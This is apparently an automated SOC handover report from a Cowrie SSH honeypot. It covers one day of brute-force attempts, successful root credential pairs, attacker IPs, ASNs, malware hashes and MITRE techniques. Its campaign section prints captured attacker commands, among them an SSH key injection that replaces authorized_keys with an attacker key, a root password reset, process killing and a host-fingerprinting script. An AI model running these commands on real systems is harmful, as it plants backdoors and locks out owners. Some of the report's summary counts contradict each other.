# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-20 |
| **Generated At** | 2026-03-20T22:27:08Z |
| **Shift Time** | 22:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **646** |
| Confirmed Threats | **0** |
| False Positives Filtered | **646** (100.0%) |
| Unique Attacker IPs | **253** |
| Countries of Origin | **0** |
| High Severity Cases | **55** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **591** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **308** |
| Unique Credential Pairs | **255** |
| Unique Usernames | **161** |
| Unique Passwords | **184** |
| Successful Auth Pairs | **53** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 55 |
| `345gs5662d34` | 15 |
| `admin` | 10 |
| `user` | 10 |
| `ubnt` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123` | 18 |
| `345gs5662d34` | 15 |
| `3245gs5662d34` | 14 |
| `password` | 10 |
| `12345` | 10 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 15 |
| `root` | `3245gs5662d34` | 14 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 4 |
| `admin` | `admin` | 3 |
| `Accept-Encoding: gzip` | `` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `q123456789` | `217.154.35.203` | 2026-03-20T01:43:26 |
| `root` | `3245gs5662d34` | `217.154.35.203` | 2026-03-20T01:43:30 |
| `root` | `121212` | `58.56.151.234` | 2026-03-20T03:08:14 |
| `root` | `qweasdzxc123.` | `120.48.55.25` | 2026-03-20T03:40:35 |
| `root` | `!@#QWEasd` | `120.48.55.25` | 2026-03-20T03:46:18 |
| `root` | `abcd1234..` | `206.189.191.70` | 2026-03-20T04:53:41 |
| `root` | `3245gs5662d34` | `206.189.191.70` | 2026-03-20T04:53:52 |
| `root` | `ubuntu` | `180.76.147.239` | 2026-03-20T07:06:24 |
| `root` | `123lol123` | `27.39.130.144` | 2026-03-20T07:22:18 |
| `root` | `Zaq12wsx!` | `95.39.82.218` | 2026-03-20T07:24:09 |
| `root` | `3245gs5662d34` | `95.39.82.218` | 2026-03-20T07:24:13 |
| `root` | `ubuntu` | `180.76.171.14` | 2026-03-20T08:13:43 |
| `root` | `69696969` | `172.173.117.246` | 2026-03-20T09:13:18 |
| `root` | `3245gs5662d34` | `172.173.117.246` | 2026-03-20T09:13:23 |
| `root` | `69696969` | `34.69.0.72` | 2026-03-20T09:14:58 |
| `root` | `3245gs5662d34` | `34.69.0.72` | 2026-03-20T09:15:04 |
| `root` | `qwerty12345` | `223.107.72.234` | 2026-03-20T09:34:29 |
| `root` | `Root1234` | `101.36.109.176` | 2026-03-20T09:36:20 |
| `root` | `3245gs5662d34` | `101.36.109.176` | 2026-03-20T09:36:23 |
| `root` | `Cloud@123` | `101.36.106.113` | 2026-03-20T10:38:01 |
| `root` | `3245gs5662d34` | `101.36.106.113` | 2026-03-20T10:38:04 |
| `root` | `P` | `101.47.13.68` | 2026-03-20T10:39:48 |
| `root` | `kjashd123sadhj123d1SS` | `106.13.85.199` | 2026-03-20T10:48:13 |
| `root` | `root2014` | `219.128.15.190` | 2026-03-20T10:53:35 |
| `root` | `root2014` | `179.185.29.233` | 2026-03-20T10:53:49 |
| `root` | `Hik12345` | `8.154.28.84` | 2026-03-20T12:45:06 |
| `root` | `r00t` | `118.45.101.159` | 2026-03-20T12:46:52 |
| `root` | `r00t` | `115.244.235.242` | 2026-03-20T12:47:04 |
| `root` | `Password2025` | `197.211.55.20` | 2026-03-20T12:53:54 |
| `root` | `3245gs5662d34` | `197.211.55.20` | 2026-03-20T12:53:59 |
| `root` | `5555555` | `218.29.196.162` | 2026-03-20T14:48:11 |
| `root` | `Qwer-1234` | `59.126.224.134` | 2026-03-20T15:15:19 |
| `root` | `3245gs5662d34` | `59.126.224.134` | 2026-03-20T15:15:23 |
| `root` | `aa789789` | `102.88.137.80` | 2026-03-20T15:16:59 |
| `root` | `3245gs5662d34` | `102.88.137.80` | 2026-03-20T15:17:06 |
| `root` | `aa789789` | `120.62.8.17` | 2026-03-20T15:21:55 |
| `root` | `3245gs5662d34` | `120.62.8.17` | 2026-03-20T15:21:56 |
| `root` | `Admin111` | `120.62.8.17` | 2026-03-20T15:23:51 |
| `root` | `p@ssw0rd` | `120.62.8.17` | 2026-03-20T15:25:43 |
| `root` | `debian` | `106.75.177.183` | 2026-03-20T15:44:09 |
| `root` | `2` | `106.14.182.77` | 2026-03-20T17:43:36 |
| `root` | `server123` | `103.101.197.221` | 2026-03-20T18:44:41 |
| `root` | `3245gs5662d34` | `103.101.197.221` | 2026-03-20T18:44:43 |
| `root` | `!QAZ2wsx#EDC` | `103.3.43.242` | 2026-03-20T20:02:55 |
| `root` | `!QAZ2wsx#EDC` | `59.22.68.213` | 2026-03-20T20:03:03 |
| `root` | `hunt5759` | `112.132.158.36` | 2026-03-20T20:13:45 |
| `root` | `root2022` | `49.124.150.249` | 2026-03-20T21:55:16 |
| `root` | `root2022` | `181.233.140.250` | 2026-03-20T21:55:28 |
| `root` | `1234567890` | `139.59.47.91` | 2026-03-20T22:18:02 |
| `root` | `password1` | `139.59.47.91` | 2026-03-20T22:19:08 |
| `root` | `admin123` | `139.59.47.91` | 2026-03-20T22:20:19 |
| `root` | `1234` | `139.59.47.91` | 2026-03-20T22:21:23 |
| `root` | `123` | `139.59.47.91` | 2026-03-20T22:22:40 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 5 | 1 | `T1082, T1592, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 14 | 12 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:3kNpwXveMV7N"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.55.25`, `8.154.28.84`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ;
```
```
uname -s -v -n -m 2 > /dev/null
```
```
uname -m 2 > /dev/null
```
```
cat /proc/uptime 2 > /dev/null | cut -d. -f1
```
```
(for d in "$HOME" /var/tmp /tmp /dev/shm; do f="$d/.x$$.sh"; echo 'echo 0' > "$f" 2>/dev/null && chmod +x "$f" 2>/dev/null && [ "$("$f" 2>/dev/null)" = "0" ] && /bin/rm -rf "$f" && exit 0; /bin/rm -rf "$f"; done; exit 1) && echo 0 || echo 1
```
Source IPs: `139.59.47.91`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `217.154.35.203`, `197.211.55.20`, `59.126.224.134`, `95.39.82.218`, `101.36.109.176`, `102.88.137.80`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **253** |
| Unique ASNs | **113** |
| High-Risk ASNs | **0** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 18 | LOW |
| `AS4134` | CHINANET-BACKBONE | 14 | LOW |
| `AS8075` | Microsoft Corporation | 13 | LOW |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 10 | LOW |
| `AS4837` | CHINA UNICOM China169 Backbone | 9 | LOW |
| `AS22773` | Cox Communications Inc. | 9 | LOW |
| `AS4766` | Korea Telecom | 8 | LOW |
| `AS17421` | Mobile Business Group | 6 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (0)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

_No priority cases this shift. All confirmed sessions were credential scans only._

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

_No reconnaissance sessions this shift._

---

## 🦠 Malware Analysis Results (10 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

_No enriched IPs with abuse scores available._

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 375 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 246 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 55 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 20 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 17 |

---

## 🔕 False Positive Summary (646 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 646 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 646 cases |
| Tool 34  | Credential Extractor        | ✅ 308 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 253 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 646 filtered (100.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 113 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 10 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 0 priority case(s) shown individually · 0 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-20T22:27:08Z_
